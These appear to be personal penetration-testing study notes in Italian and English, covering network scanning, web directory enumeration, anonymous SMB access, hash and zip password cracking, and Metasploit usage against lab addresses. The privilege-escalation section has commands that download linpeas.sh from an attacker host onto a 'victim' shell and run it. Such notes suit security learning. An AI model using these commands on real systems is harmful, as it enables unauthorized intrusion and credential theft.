#### Virtual Box
Set VM internet:
- **Bridge** -->  conn a internet   (selezioni il ponte in base a se sei conn al wifi o ethern)
- Nat -->  conn a internet + conn tra diverse vm

Per Nat:
devi creare una NatNetwork =>       - File > Tools > Network Manager
						     - seleziona Nat Networks
						     - Create

----
## Linux

`sudo -l`
 tells you which command you can execute as root without inserting the root password

-------
## Tools
### General
#### Locate
useful to find where a file/program is located
`locate file.txt`

----
### Information Gathering
#### Netdiscover
tools for scanning the entire net to find hosts ip (using arp)
`sudo netdiscover -r 10.0.2.0/24`           -r = scan a given range instead of     
                                    auto scan

----
#### Nmap
tools for scanning ports to identify open ports
`nmap -T4 -p- -A 10.0.2.152`
`nmap -Pn --script smb-vuln* -p 139,445 10.0.2.152`

`-T4` —> set scan velocity from 1 to 5 (1 slow but complete - 5 fast but)
`-p-` —> scan all ports (without scann only 1000 most known) 
`-A` —> show me all that you found
`-Pn` --> treat all hosts as online -- skip host discovery

-----

### Enumerating HTTP e HTTPS
#### Nikto
scanning website vulnerabilities
`nikto -h http://10.0.2.152`      -h = host

#### Dirbuster
finds hidden file/subdirectories website
`dirbuster`
![[Pasted image 20240214122906.png]]
- Faremo una scansione usando una wordlist predefinita di dirbuster 
- La wordlist —> contiene tanti subdomains noti (es /admin, /root, /…)
- Proverà per ciascuno di essi a vedere se esiste: es [http://10.0.2.152/admin](http://10.0.2.152/admin) e così via

- L’estensione serve a specificare quali tipologie di subdomain deve cercare
- mettendo solo php ⇒ cercherà l’esistenza di tutte le directory nella wordlist add il .php alla fine es [http://192.168.5.5/admin.php](http://192.168.5.5/admin.php)

Altre possibili estensioni —> pdf, rar, zip, docx … (+ ne metti e + è lunga la scans)

- Clicca su Tree View per vedere la struttura ad albero dei file trovati. 
- Se clicchi con il tasto dx su un file e apri nel browser ti mostrerà la pagina
![[Pasted image 20240214123126.png]]

#### dirb
finds hidden file/subdirectories website
`dirb http://10.0.2.152`
> [!INFO] 
> For each subdomains it finds =>  check inside that subdomains if there are others  
> =>
> is **<span style="color:#ff0000">recursive</span>** => can <span style="color:#ff0000">be slow</span>

#### ffuf
finds hidden file/subdirectories website
`sudo apt install ffuf`
`ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ_VARIABLE -u http://10.0.2.152/FUZZ_VARIABLE`
for each word inside the wordlist => try to find if it exists the webiste + word
> [!INFO] 
> by default it's not recursive
> =>
> Check only one deep layer => <span style="color:#00b050">faster</span>

-----
### Enumerating SMB
#### Metasploit
If you don't know a lot of a protocol =>  search for it inside metasploit to see the modul
`search smb`
`use 0`
`info`
`options`
`set RHOSTS ...`
`run`

#### Smbclient
tries to connect anonimmously to smb file sharing
`smbclient -L \\\\\\\\10.0.2.152\\\\`                 (-L list)

> [!WARNING] Se da questo errore
> `protocol negotiation failed: NT_STATUS_IO_TIMEOUT`
> ⇒  modifica il file `/etc/samba/smb.conf` 
> Aggiungendo sotto “global”:
> `client min protocol = CORE` 
> `client max protocol = SMB3`

![[Pasted image 20240214124007.png]]

Try to connect to ADMIN$:
`smbclient -L \\\\\\\\10.0.2.152\\\\ADMIN$`
leave password empty

---

### Hash
#### Hash-identifier
check if the string that you have is an hash and what type
`hash-identifier`
`paste hash`

#### hashcat
useful for cracking hash using wordlist         [[cheet#Locate]]
`locate wordlist.txt`
`hashcat -m 0 file_contains_hash.txt /path/wordlist.txt`
`-m 0` -->  use module 0 => crack md5

> [!WARNING] 
> hashcat is heavy on GPU => it's bettere to avoid it inside a VM

----
### Crack
#### fcrackzip
cracks password protected zip files with brute force or dictionary based attacks
`fcrackzip -v -u -D -p /wordlist.txt zipName.zip`
`-v` -->  verbose
`-u` -->  unzip
`-D` --> Dictionary attack
`-p` -->  zip that we want to crack
### Privilege Escalation
#### linpeas
automated tool to check if there are some potential priv escal inside the target
[linpeas github](https://github.com/carlospolop/PEASS-ng/releases/tag/20240211-db8c669a)
- Saved it locally inside a folder (+)
- create a server with python to download the script from the victim
- `cd (+)`
- `python3 -m http.server 80`
- from the victim shell:
	- `wget http://IP-ATTACKER/linpeas.sh`
	- `chmod +x linpeas.sh`
	- `./linpeas.sh`
	

----
## Sites
### GTFOBins 
curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems
[GTFOBins](https://gtfobins.github.io/)
